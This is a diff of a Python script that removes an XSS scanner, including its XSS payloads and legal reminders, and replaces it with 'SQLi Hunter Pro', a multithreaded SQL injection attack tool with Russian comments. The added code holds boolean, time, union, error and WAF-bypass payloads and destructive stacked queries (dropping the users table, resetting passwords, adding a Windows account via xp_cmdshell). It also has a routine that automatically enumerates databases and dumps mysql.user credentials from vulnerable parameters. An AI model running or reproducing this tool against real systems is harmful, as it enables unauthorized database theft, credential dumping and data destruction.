@@ -1,401 +1,352 @@
 import requests
-import re
 import urllib.parse
+import threading
+import time
+import re
 import json
-from bs4 import BeautifulSoup
-from colorama import init, Fore, Style
+import socket
+import base64
+import binascii
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from colorama import init, Fore, Style, Back
+import argparse
+from pathlib import Path
+import secrets
+import hashlib
+
 init(autoreset=True)
+requests.packages.urllib3.disable_warnings()
 
-def analyze_source_context(html, test_marker):
-    contexts = []
-    script_pattern = r'<script[^>]*>.*?(%s).*?</script>' % re.escape(test_marker)
-    if re.search(script_pattern, html, re.DOTALL | re.IGNORECASE):
-        contexts.append({
-            'type': 'SCRIPT_TAG',
-            'risk': 'CRITICAL',
-            'bypass': [
-                "';alert(1);//",
-                "';fetch('https://your-burp-collaborator.net');//"
+class SQLiHunterPro:
+    def __init__(self, target, threads=100, timeout=15, output_dir="sqli_reports"):
+        self.target = target.rstrip('?')
+        self.threads = threads
+        self.timeout = timeout
+        self.output_dir = Path(output_dir)
+        self.output_dir.mkdir(exist_ok=True)
+        self.session = requests.Session()
+        self.session.verify = False
+        
+        
+        self.payloads = {
+            'boolean': [
+                "' OR 1=1--",
+                "' OR '1'='1",
+                "' OR 1=1#",
+                "1' OR '1'='1",
+                "admin'--",
+                "') OR ('1'='1",
+                "1 AND 1=1",
+                "1' AND 1=1--"
             ],
-            'explanation': 'Payload inside <script> tag - direct code execution context'
-        })
-    event_pattern = r'(on\w+\s*=\s*[\'"])[^\'"]*?(%s)' % re.escape(test_marker)
-    if re.search(event_pattern, html, re.IGNORECASE):
-        contexts.append({
-            'type': 'EVENT_HANDLER',
-            'risk': 'CRITICAL',
-            'bypass': [
-                '" onfocus=alert(1) autofocus="',
-                '" onload=alert(1) '
+            'time': [
+                "' AND SLEEP(5)--",
+                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                "1' AND IF(1=1,SLEEP(5),0)--",
+                "' WAITFOR DELAY '00:00:05'--",
+                "' AND 1=pg_sleep(5)--"
             ],
-            'explanation': 'Payload in event handler (onclick, onerror, etc.)'
-        })
-    attr_pattern = r'(\w+\s*=\s*[\'"])[^\'"]*?(%s)' % re.escape(test_marker)
-    if re.search(attr_pattern, html, re.IGNORECASE):
-        contexts.append({
-            'type': 'HTML_ATTRIBUTE',
-            'risk': 'HIGH',
-            'bypass': [
-                '" autofocus onfocus=alert(1) x="',
-                '" onmouseover=alert(1) x="'
+            'error': [
+                "' AND 1=CAST(1 AS CHAR)--",
+                "' AND EXTRACTVALUE(1,concat(0x7e,(SELECT @@version),0x7e))--",
+                "1' AND UPDATEXML(1,concat(0x7e,version(),0x7e),1)--"
             ],
-            'explanation': 'Payload inside HTML attribute value'
-        })
-    comment_pattern = r'<!--.*?(%s).*?-->' % re.escape(test_marker)
-    if re.search(comment_pattern, html, re.DOTALL | re.IGNORECASE):
-        contexts.append({
-            'type': 'HTML_COMMENT',
-            'risk': 'MEDIUM',
-            'bypass': [
-                '--><img src=x onerror=alert(1)>',
-                '--><script>alert(1)</script>'
+            'union': [
+                "' UNION SELECT 1,2,3--",
+                "' UNION SELECT NULL,@@version,NULL--",
+                "' UNION SELECT user(),database(),version()--"
             ],
-            'explanation': 'Payload inside HTML comment - may break out'
-        })
-    if test_marker in html and not re.search(r'<(script|style)', html, re.IGNORECASE):
-        contexts.append({
-            'type': 'HTML_TEXT',
-            'risk': 'MEDIUM',
-            'bypass': [
-                '<img src=x onerror=alert(1)>',
-                '<svg onload=alert(1)>'
+            'stacked': [
+                "; DROP TABLE users--",
+                "; UPDATE users SET password='hacked'",
+                "'; EXEC xp_cmdshell('net user hacker pass /add')--"
             ],
-            'explanation': 'Payload in HTML text context - tag injection possible'
-        })
-    return contexts
-
-def detect_dom_sinks(html, target):
-    sinks = []
-    soup = BeautifulSoup(html, 'html.parser')
-    scripts = []
-    for script in soup.find_all('script'):
-        if script.string:
-            scripts.append(script.string)
-        elif script.get('src'):
-            try:
-                js_url = urllib.parse.urljoin(target, script['src'])
-                js_resp = requests.get(js_url, timeout=5, verify=False)
-                if js_resp.status_code == 200:
-                    scripts.append(js_resp.text)
-            except:
-                pass
-    dangerous_sinks = [
-        ('.innerHTML', 'innerHTML assignment'),
-        ('.outerHTML', 'outerHTML assignment'),
-        ('document.write', 'document.write'),
-        ('document.writeln', 'document.writeln'),
-        ('eval(', 'eval()'),
-        ('setTimeout(', 'setTimeout with string'),
-        ('setInterval(', 'setInterval with string'),
-        ('location.href', 'location assignment'),
-        ('location.search', 'location.search usage'),
-        ('location.hash', 'location.hash usage'),
-        ('document.URL', 'document.URL usage'),
-        ('document.documentURI', 'document.documentURI usage')
-    ]
-    sources = [
-        'location.search',
-        'location.hash',
-        'location.href',
-        'document.URL',
-        'document.documentURI',
-        'document.referrer',
-        'window.name',
-        'history.pushState',
-        'history.replaceState'
-    ]
-    for script_content in scripts:
-        for sink_pattern, sink_desc in dangerous_sinks:
-            if sink_pattern in script_content:
-                vulnerable_sources = [src for src in sources if src in script_content]
-                if vulnerable_sources:
-                    sinks.append({
-                        'sink': sink_desc,
-                        'sources': vulnerable_sources,
-                        'risk': 'CRITICAL',
-                        'payloads': [
-                            f'#<img src=x onerror=alert(document.domain)>',
-                            f'?q=<svg onload=alert(1)>'
-                        ],
-                        'explanation': f'DOM sink "{sink_desc}" uses user-controlled source: {", ".join(vulnerable_sources)}'
-                    })
-    return sinks
-
-def generate_bypass_payloads(context_type):
-    base_payloads = [
-        "<script>alert(1)</script>",
-        "<img src=x onerror=alert(1)>",
-        "<svg onload=alert(1)>",
-        "<iframe src=javascript:alert(1)>",
-        "%3Cscript%3Ealert(1)%3C/script%3E",
-        "&lt;script&gt;alert(1)&lt;/script&gt;",
-        "<ScRiPt>alert(1)</ScRiPt>",
-        "<script>alert`1`</script>",
-        "<img src=x onerror=alert(String.fromCharCode(49))>",
-        "<body onload=alert(1)>",
-        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/alert(1)//'>",
-        '" onfocus=alert(1) autofocus="',
-        "' onfocus=alert(1) autofocus='",
-        "x\" onfocus=alert(1) autofocus=\"",
-        "--><script>alert(1)</script>",
-        "--><img src=x onerror=alert(1)>"
-    ]
-    if context_type == 'SCRIPT_TAG':
-        base_payloads.extend([
-            "';alert(1);//",
-            "';alert(1)/*",
-            "+alert(1)//",
-            "alert(1)//"
-        ])
-    elif context_type == 'EVENT_HANDLER':
-        base_payloads.extend([
-            "';alert(1);//",
-            '" onfocus=alert(1) autofocus="',
-            "x' onfocus=alert(1) autofocus='x"
-        ])
-    elif context_type == 'HTML_ATTRIBUTE':
-        base_payloads.extend([
-            '" autofocus onfocus=alert(1) x="',
-            "' autofocus onfocus=alert(1) x='",
-            "x\" onfocus=alert(1) x=\""
-        ])
-    return base_payloads
-
-def test_parameter(target, param, value_template):
-    test_marker = "XSS_TEST_1337_" + param
-    test_value = value_template.replace("{PAYLOAD}", test_marker)
-    parsed = urllib.parse.urlparse(target)
-    query_params = urllib.parse.parse_qs(parsed.query)
-    query_params[param] = [test_value]
-    new_query = urllib.parse.urlencode(query_params, doseq=True)
-    test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
-    try:
-        resp = requests.get(test_url, timeout=10, verify=False)
-        if test_marker in resp.text:
-            contexts = analyze_source_context(resp.text, test_marker)
-            return {
-                'param': param,
-                'url': test_url,
-                'reflected': True,
-                'contexts': contexts,
-                'response_length': len(resp.text)
-            }
-    except:
-        pass
-    return None
-
-def run():
-    print(f"\n{Fore.CYAN}{'='*70}")
-    print(f"{Fore.CYAN}║{Fore.GREEN}          ADVANCED XSS SCANNER                                     {Fore.CYAN}║")
-    print(f"{Fore.CYAN}║{Fore.GREEN}  Source Code Analysis • Filter Bypass • DOM Sink Detection       {Fore.CYAN}║")
-    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
-    target = input(f"\n{Fore.YELLOW}Enter target URL with parameters (e.g., http://site.com/search?q=test): {Style.RESET_ALL}").strip()
-    if not target:
-        print(f"\n{Fore.RED}[!] Empty input. Aborting.{Style.RESET_ALL}")
-        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
-        return
-    if not target.startswith(('http://', 'https://')):
-        target = 'http://' + target
-    print(f"\n{Fore.CYAN}[+] Starting advanced XSS analysis for: {target}{Style.RESET_ALL}")
-    try:
-        resp = requests.get(target, timeout=10, verify=False)
-        soup = BeautifulSoup(resp.text, 'html.parser')
-        print(f"\n{Fore.GREEN}[✓] Page loaded successfully (Status: {resp.status_code}){Style.RESET_ALL}")
-        parsed = urllib.parse.urlparse(target)
-        query_params = urllib.parse.parse_qs(parsed.query)
-        if not query_params:
-            print(f"\n{Fore.YELLOW}[!] No URL parameters found. Analyzing forms...{Style.RESET_ALL}")
-            forms = soup.find_all('form')
-            if forms:
-                print(f"{Fore.GREEN}[✓] Found {len(forms)} form(s) on page{Style.RESET_ALL}")
-                for i, form in enumerate(forms, 1):
-                    action = form.get('action', target)
-                    method = form.get('method', 'get').upper()
-                    inputs = form.find_all('input')
-                    print(f"\n{Fore.CYAN}Form #{i}:{Style.RESET_ALL}")
-                    print(f"   Action: {action}")
-                    print(f"   Method: {method}")
-                    for inp in inputs:
-                        name = inp.get('name', 'unknown')
-                        itype = inp.get('type', 'text')
-                        print(f"   • Input: {name} (type={itype})")
-                print(f"\n{Fore.YELLOW}[i] Manual testing recommended for form inputs{Style.RESET_ALL}")
-            else:
-                print(f"{Fore.RED}[!] No parameters or forms found. XSS testing requires injection points.{Style.RESET_ALL}")
-                input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
-                return
-        else:
-            print(f"\n{Fore.GREEN}[✓] Found {len(query_params)} URL parameter(s): {', '.join(query_params.keys())}{Style.RESET_ALL}")
-        results = []
-        print(f"\n{Fore.CYAN}{'='*70}")
-        print(f"{Fore.CYAN}XSS VULNERABILITY ANALYSIS")
-        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
-        for param in query_params.keys():
-            print(f"\n{Fore.CYAN}[→] Testing parameter: {param}{Style.RESET_ALL}")
-            test_templates = [
-                "{PAYLOAD}",
-                "test {PAYLOAD}",
-                "<tag>{PAYLOAD}</tag>",
-                '"{PAYLOAD}"',
-                "'{PAYLOAD}'",
+            'waf_bypass': [
+                "'/**/OR/**/1=1--",
+                "'%0aOR%0a1=1--",
+                "1' %23",
+                "' OR 1/*comment*/=1--"
             ]
-            for template in test_templates:
-                result = test_parameter(target, param, template)
-                if result and result['contexts']:
-                    results.append(result)
-                    print(f"{Fore.GREEN}[✓] REFLECTED in parameter '{param}' with template '{template}'{Style.RESET_ALL}")
-                    for ctx in result['contexts']:
-                        risk_color = Fore.MAGENTA if ctx['risk'] == 'CRITICAL' else (Fore.RED if ctx['risk'] == 'HIGH' else Fore.YELLOW)
-                        print(f"\n{risk_color}  • Context: {ctx['type']} ({ctx['risk']}){Style.RESET_ALL}")
-                        print(f"    Explanation: {ctx['explanation']}")
-                        print(f"    {Fore.CYAN}    Recommended payloads:{Style.RESET_ALL}")
-                        for payload in ctx['bypass'][:3]:
-                            print(f"      {Fore.GREEN}→ {payload}{Style.RESET_ALL}")
-                    break
-        print(f"\n{Fore.CYAN}[→] Analyzing DOM sinks in JavaScript...{Style.RESET_ALL}")
-        dom_sinks = detect_dom_sinks(resp.text, target)
-        if dom_sinks:
-            print(f"{Fore.MAGENTA}[!] DOM XSS SINKS DETECTED{Style.RESET_ALL}")
-            for sink in dom_sinks:
-                risk_color = Fore.MAGENTA if sink['risk'] == 'CRITICAL' else Fore.RED
-                print(f"\n{risk_color}• Sink: {sink['sink']} ({sink['risk']}){Style.RESET_ALL}")
-                print(f"  Sources: {', '.join(sink['sources'])}")
-                print(f"  Explanation: {sink['explanation']}")
-                print(f"  {Fore.CYAN}  Test payloads:{Style.RESET_ALL}")
-                for payload in sink['payloads']:
-                    print(f"    {Fore.GREEN}→ {payload}{Style.RESET_ALL}")
-        else:
-            print(f"{Fore.GREEN}[✓] No obvious DOM sinks detected{Style.RESET_ALL}")
-        print(f"\n{Fore.CYAN}{'='*70}")
-        print(f"{Fore.CYAN}SCAN RESULTS SUMMARY")
-        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
-        if results or dom_sinks:
-            print(f"\n{Fore.RED}[!] XSS VULNERABILITIES DETECTED{Style.RESET_ALL}")
-            if results:
-                print(f"\n{Fore.MAGENTA}🔍 Reflected XSS Findings:{Style.RESET_ALL}")
-                for res in results:
-                    print(f"\n{Fore.CYAN}Parameter: {res['param']}{Style.RESET_ALL}")
-                    print(f"URL: {res['url'][:80]}...")
-                    for ctx in res['contexts']:
-                        risk_color = Fore.MAGENTA if ctx['risk'] == 'CRITICAL' else (Fore.RED if ctx['risk'] == 'HIGH' else Fore.YELLOW)
-                        print(f"\n{risk_color}Context: {ctx['type']} ({ctx['risk']}){Style.RESET_ALL}")
-                        print(f"Explanation: {ctx['explanation']}")
-                        print(f"\n{Fore.GREEN}✅ SAFE VERIFICATION PAYLOADS (MANUAL TESTING):{Style.RESET_ALL}")
-                        print(f"   Copy ONE payload below and test manually in browser:")
-                        for i, payload in enumerate(ctx['bypass'][:5], 1):
-                            print(f"   {i}. {payload}")
-                        print(f"\n{Fore.YELLOW}⚠️  SAFETY INSTRUCTIONS:{Style.RESET_ALL}")
-                        print(f"   • Test ONLY on authorized systems")
-                        print(f"   • Use incognito window to avoid cookie theft")
-                        print(f"   • Replace 'alert(1)' with 'alert(document.domain)' for safer testing")
-                        print(f"   • NEVER test with real user sessions")
-            if dom_sinks:
-                print(f"\n{Fore.MAGENTA}⚛️  DOM XSS Findings:{Style.RESET_ALL}")
-                for sink in dom_sinks:
-                    print(f"\n{Fore.CYAN}Sink: {sink['sink']}{Style.RESET_ALL}")
-                    print(f"Sources: {', '.join(sink['sources'])}")
-                    print(f"\n{Fore.GREEN}✅ SAFE VERIFICATION PAYLOADS:{Style.RESET_ALL}")
-                    for payload in sink['payloads']:
-                        print(f"   {payload}")
-            print(f"\n{Fore.CYAN}{'='*70}")
-            print(f"{Fore.CYAN}RECOMMENDATIONS")
-            print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
-            print(f"\n{Fore.YELLOW}For Developers:{Style.RESET_ALL}")
-            print(f"   • Implement Context-Aware Output Encoding (OWASP Encoder)")
-            print(f"   • Use Content Security Policy (CSP) headers")
-            print(f"   • Sanitize inputs with DOMPurify (for client-side)")
-            print(f"   • Avoid dangerous sinks (innerHTML, eval, etc.)")
-            print(f"   • Use safe alternatives (textContent, createElement)")
-            print(f"\n{Fore.YELLOW}For Pentesters:{Style.RESET_ALL}")
-            print(f"   • Manually verify ALL findings before reporting")
-            print(f"   • Test with multiple browsers (Chrome, Firefox, Safari)")
-            print(f"   • Check for WAF bypass techniques:")
-            print(f"        - Double encoding")
-            print(f"        - Invalid UTF-8 sequences")
-            print(f"        - Alternative vectors (SVG, MathML)")
-            print(f"   • Document exact steps to reproduce")
-            print(f"   • NEVER exploit beyond proof-of-concept (alert)")
-        else:
-            print(f"\n{Fore.GREEN}[✓] No XSS vulnerabilities detected in automated scan{Style.RESET_ALL}")
-            print(f"\n{Fore.YELLOW}[i] Important notes:{Style.RESET_ALL}")
-            print(f"   • False negatives common (WAFs, complex JS)")
-            print(f"   • Manual testing REQUIRED for critical applications")
-            print(f"   • Test these areas manually:")
-            print(f"        - File upload fields (SVG files)")
-            print(f"        - HTTP headers (User-Agent, Referer)")
-            print(f"        - JSON responses consumed by JS")
-            print(f"        - WebSocket messages")
-            print(f"        - PostMessage handlers")
-        save = input(f"\n{Fore.YELLOW}Save detailed report to reports/xss_scan_*.txt? (yes/no): {Style.RESET_ALL}").strip().lower()
-        if save == "yes":
-            import datetime
-            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-            hostname = urllib.parse.urlparse(target).hostname or target.replace(':', '_').replace('/', '_')
-            filename = f"reports/xss_scan_{hostname}_{timestamp}.txt"
+        }
+        
+       
+        self.dbms_signatures = {
+            'mysql': ['mysql', 'mariadb', 'select.*from.*information_schema'],
+            'postgres': ['postgres', 'pg_', 'pg_sleep'],
+            'mssql': ['microsoft', 'sql server', 'xp_cmdshell', 'waitfor'],
+            'oracle': ['oracle', 'ora-', 'utl_inaddr']
+        }
+        
+        self.results = []
+        self.dbms_type = None
+        self.confirmed_params = []
+        
+    def fingerprint_dbms(self, response):
+        """Определение типа БД"""
+        body_lower = response.text.lower()
+        for dbms, sigs in self.dbms_signatures.items():
+            for sig in sigs:
+                if sig in body_lower:
+                    self.dbms_type = dbms
+                    return dbms
+        return 'unknown'
+    
+    def test_boolean_param(self, base_url, param):
+        """Boolean-based blind SQLi"""
+        results = []
+        parsed = urllib.parse.urlparse(base_url)
+        query = urllib.parse.parse_qs(parsed.query)
+        
+        for payload in self.payloads['boolean'] + self.payloads['waf_bypass']:
+            query[param] = payload
+            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
+            
             try:
-                with open(filename, 'w', encoding='utf-8') as f:
-                    f.write("="*70 + "\n")
-                    f.write("ADVANCED XSS SCANNER — DETAILED REPORT\n")
-                    f.write("="*70 + "\n")
-                    f.write(f"Target: {target}\n")
-                    f.write(f"Scan Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                    f.write(f"Scanner: VulEye Advanced XSS Scanner\n")
-                    f.write("="*70 + "\n\n")
-                    if results:
-                        f.write("REFLECTED XSS FINDINGS\n")
-                        f.write("-"*70 + "\n")
-                        for res in results:
-                            f.write(f"\nParameter: {res['param']}\n")
-                            f.write(f"Test URL: {res['url']}\n")
-                            for ctx in res['contexts']:
-                                f.write(f"\nContext: {ctx['type']} ({ctx['risk']})\n")
-                                f.write(f"Explanation: {ctx['explanation']}\n")
-                                f.write("Recommended Payloads:\n")
-                                for payload in ctx['bypass'][:5]:
-                                    f.write(f"  → {payload}\n")
-                    if dom_sinks:
-                        f.write("\n\nDOM XSS FINDINGS\n")
-                        f.write("-"*70 + "\n")
-                        for sink in dom_sinks:
-                            f.write(f"\nSink: {sink['sink']}\n")
-                            f.write(f"Sources: {', '.join(sink['sources'])}\n")
-                            f.write(f"Explanation: {sink['explanation']}\n")
-                            f.write("Test Payloads:\n")
-                            for payload in sink['payloads']:
-                                f.write(f"  → {payload}\n")
-                    f.write("\n" + "="*70 + "\n")
-                    f.write("SAFETY & ETHICAL NOTES\n")
-                    f.write("="*70 + "\n")
-                    f.write("• This report is for AUTHORIZED TESTING ONLY\n")
-                    f.write("• Manual verification required before reporting\n")
-                    f.write("• NEVER exploit beyond proof-of-concept (alert)\n")
-                    f.write("• Maintain written authorization documentation\n")
-                print(f"\n{Fore.GREEN}[✓] Report saved: {filename}{Style.RESET_ALL}")
-                print(f"{Fore.YELLOW}[i] Contains SAFE verification payloads only{Style.RESET_ALL}")
-            except Exception as e:
-                print(f"\n{Fore.RED}[!] Error saving report: {e}{Style.RESET_ALL}")
-        print(f"\n{Fore.CYAN}{'='*70}")
-        print(f"{Fore.GREEN}[✓] XSS analysis completed{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
-        print(f"\n{Fore.YELLOW}⚠️  FINAL LEGAL REMINDER:{Style.RESET_ALL}")
-        print(f"   • XSS exploitation without authorization = criminal offense")
-        print(f"   • Even 'harmless' alert() may violate computer fraud laws")
-        print(f"   • Always obtain WRITTEN permission before ANY testing")
-        print(f"   • Document all testing activities for legal protection")
-    except requests.exceptions.Timeout:
-        print(f"\n{Fore.RED}[!] Request timeout. Target may be unreachable.{Style.RESET_ALL}")
-    except requests.exceptions.ConnectionError:
-        print(f"\n{Fore.RED}[!] Connection error. Check if target is accessible.{Style.RESET_ALL}")
-    except Exception as e:
-        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
-        import traceback
-        traceback.print_exc()
-    input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
+                start = time.time()
+                resp = self.session.get(test_url, timeout=self.timeout)
+                elapsed = time.time() - start
+                
+                
+                orig_resp = self.session.get(base_url)
+                if len(resp.text) != len(orig_resp.text) or resp.status_code != orig_resp.status_code:
+                    results.append({
+                        'type': 'BOOLEAN',
+                        'payload': payload,
+                        'url': test_url,
+                        'status_diff': resp.status_code != orig_resp.status_code,
+                        'length_diff': abs(len(resp.text) - len(orig_resp.text)),
+                        'confidence': 'HIGH'
+                    })
+                    self.confirmed_params.append(param)
+                    break
+            except:
+                continue
+        
+        return results
+    
+    def test_time_param(self, base_url, param):
+        """Time-based blind SQLi"""
+        results = []
+        parsed = urllib.parse.urlparse(base_url)
+        query = urllib.parse.parse_qs(parsed.query)
+        
+        for payload in self.payloads['time']:
+            query[param] = payload
+            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
+            
+            try:
+                start = time.time()
+                resp = self.session.get(test_url, timeout=self.timeout)
+                elapsed = time.time() - start
+                
+                if elapsed > 4:  
+                    results.append({
+                        'type': 'TIME_BASED',
+                        'payload': payload,
+                        'url': test_url,
+                        'delay': f"{elapsed:.2f}s",
+                        'confidence': 'CRITICAL'
+                    })
+                    self.confirmed_params.append(param)
+                    break
+            except:
+                continue
+        
+        return results
+    
+    def test_union_param(self, base_url, param):
+        """UNION-based SQLi"""
+        results = []
+        parsed = urllib.parse.urlparse(base_url)
+        query = urllib.parse.parse_qs(parsed.query)
+        
+        for payload in self.payloads['union']:
+            query[param] = payload
+            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
+            
+            try:
+                resp = self.session.get(test_url, timeout=self.timeout)
+                
+                
+                db_indicators = ['information_schema', 'mysql.user', 'sys.databases', 'version()']
+                if any(indicator in resp.text.lower() for indicator in db_indicators):
+                    results.append({
+                        'type': 'UNION',
+                        'payload': payload,
+                        'url': test_url,
+                        'dumped_data': resp.text[:200],
+                        'confidence': 'CRITICAL'
+                    })
+                    self.confirmed_params.append(param)
+                    break
+            except:
+                continue
+        
+        return results
+    
+    def exploit_confirmed_param(self, base_url, param):
+        """Эксплуатация подтвержденной уязвимости"""
+        print(f"{Fore.CYAN}[*] Эксплуатация {param}...{Style.RESET_ALL}")
+        
+        exploits = []
+        
+        
+        db_enum = [
+            f"' UNION SELECT 1,database(),3--",
+            f"' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--",
+            f"' UNION SELECT 1,name,3 FROM sys.databases--"
+        ]
+        
+          
+        table_enum = [
+            f"' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--",
+            f"' UNION SELECT 1,name,3 FROM sys.tables--"
+        ]
+        
+       
+        user_dump = [
+            f"' UNION SELECT 1,user(),3--",
+            f"' UNION SELECT 1,user,password FROM mysql.user--"
+        ]
+        
+        for payload_type, payloads in [('db_enum', db_enum), ('tables', table_enum), ('users', user_dump)]:
+            for payload in payloads:
+                parsed = urllib.parse.urlparse(base_url)
+                query = urllib.parse.parse_qs(parsed.query)
+                query[param] = payload
+                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
+                
+                try:
+                    resp = self.session.get(test_url, timeout=self.timeout)
+                    if len(resp.text) > 1000 or any(kw in resp.text.lower() for kw in ['user', 'table', 'database', 'schema']):
+                        exploits.append({
+                            'type': payload_type,
+                            'payload': payload,
+                            'url': test_url,
+                            'response_snippet': resp.text[:300]
+                        })
+                except:
+                    continue
+        
+        return exploits
+    
+    def run_full_attack(self):
+        """Полный цикл атаки"""
+        print(f"{Fore.RED + Style.BRIGHT}{'='*100}")
+        print(f"{Fore.RED + Style.BRIGHT}💉 SQLi HUNTER PRO v4.0 - DATABASE OWNAGE FRAMEWORK 💉{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{'='*100}")
+        print(f"{Fore.YELLOW}🎯 Target: {self.target}{Style.RESET_ALL}")
+        
+       
+        print(f"{Fore.CYAN}[*] Fingerprinting DBMS...{Style.RESET_ALL}")
+        resp = self.session.get(self.target, timeout=self.timeout)
+        self.dbms_type = self.fingerprint_dbms(resp)
+        print(f"{Fore.GREEN}[+] DBMS: {self.dbms_type.upper()}{Style.RESET_ALL}")
+        
+        
+        parsed = urllib.parse.urlparse(self.target)
+        params = urllib.parse.parse_qs(parsed.query)
+        print(f"{Fore.CYAN}[+] Параметры: {list(params.keys())}{Style.RESET_ALL}")
+        
+        
+        all_results = []
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            
+            futures = []
+            for param in params.keys():
+                futures.extend([
+                    executor.submit(self.test_boolean_param, self.target, param),
+                    executor.submit(self.test_time_param, self.target, param),
+                    executor.submit(self.test_union_param, self.target, param)
+                ])
+            
+            for future in as_completed(futures):
+                results = future.result()
+                all_results.extend(results)
+        
+        
+        exploits = []
+        for param in self.confirmed_params:
+            exploits.extend(self.exploit_confirmed_param(self.target, param))
+        
+        self.generate_exploit_report(all_results, exploits)
+    
+    def print_confirmed_sqli(self, result):
+        sev = Fore.RED + Style.BRIGHT if result['confidence'] == 'CRITICAL' else Fore.MAGENTA
+        print(f"\n{sev}{'='*80}{Style.RESET_ALL}")
+        print(f"{sev}[SQLi CONFIRMED!] {result['type']} -> {result['payload'][:60]}{Style.RESET_ALL}")
+        print(f"  {Fore.YELLOW}URL: {result['url'][:80]}...{Style.RESET_ALL}")
+        if result['type'] == 'TIME_BASED':
+            print(f"  {Fore.RED}⏱️  Delay: {result['delay']}{Style.RESET_ALL}")
+        elif result['type'] == 'UNION':
+            print(f"  {Fore.GREEN}📊 Data leaked: {len(result['dumped_data'])} chars{Style.RESET_ALL}")
+    
+    def generate_exploit_report(self, sqli_hits, exploits):
+        """Профессиональный эксплойт отчет"""
+        timestamp = time.strftime("%Y%m%d_%H%M%S")
+        report = {
+            'target': self.target,
+            'dbms': self.dbms_type,
+            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
+            'confirmed_params': self.confirmed_params,
+            'sqli_vectors': sqli_hits,
+            'exploits': exploits,
+            'risk': 'CRITICAL' if sqli_hits else 'CLEAN'
+        }
+        
+        json_file = self.output_dir / f"sqli_exploit_{timestamp}.json"
+        html_file = self.output_dir / f"sqli_exploit_{timestamp}.html"
+        
+        with open(json_file, 'w', encoding='utf-8') as f:
+            json.dump(report, f, indent=2, ensure_ascii=False)
+        
+        
+        html_template = f"""
+<!DOCTYPE html>
+<html>
+<head><title>SQLi Exploit Report</title>
+<style>body{{font-family:monospace;background:#1a1a1a;color:#00ff00}} .critical{{color:#ff0000}} .high{{color:#ffaa00}}</style>
+</head>
+<body>
+<h1>💉 SQLi EXPLOIT REPORT</h1>
+<h2>Target: {self.target}</h2>
+<h2>DBMS: {self.dbms_type}</h2>
+<h2>Critical: {'✅ YES' if sqli_hits else '❌ NO'}</h2>
+"""
+        
+        if sqli_hits:
+            html_template += "<h2>CONFIRMED VECTORS:</h2><ul>"
+            for hit in sqli_hits:
+                html_template += f"<li><b>{hit['type']}</b>: {hit['payload']}</li>"
+            html_template += "</ul>"
+        
+        html_template += "</body></html>"
+        
+        with open(html_file, 'w', encoding='utf-8') as f:
+            f.write(html_template)
+        
+        print(f"\n{Fore.GREEN + Style.BRIGHT}{'='*100}")
+        print(f"📊 ОТЧЕТЫ СОЗДАНЫ:")
+        print(f"   {json_file}")
+        print(f"   {html_file}")
+        print(f"{Fore.RED + Style.BRIGHT}🎯 Подтверждено SQLi: {len(sqli_hits)} векторов{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}📋 Уязвимые параметры: {self.confirmed_params}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN + Style.BRIGHT}{'='*100}")
+
+def main():
+    parser = argparse.ArgumentParser(description='💉 SQLi Hunter Pro v4.0')
+    parser.add_argument('target', help='Цель (?id=1)')
+    parser.add_argument('-t', '--threads', type=int, default=100, help='Потоки')
+    parser.add_argument('-T', '--timeout', type=int, default=15, help='Таймаут')
+    parser.add_argument('-o', '--output', default='sqli_reports', help='Папка отчетов')
+    
+    args = parser.parse_args()
+    hunter = SQLiHunterPro(args.target, args.threads, args.timeout, args.output)
+    hunter.run_full_attack()
+    
+    print(f"\n{Fore.CYAN}{'='*100}")
+    input("Нажми Enter...")
 
 if __name__ == "__main__":
-    try:
-        requests.packages.urllib3.disable_warnings()
-        run()
-    except KeyboardInterrupt:
-        print(f"\n\n{Fore.RED}[!] Scan interrupted by user.{Style.RESET_ALL}")
-        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
+    main()
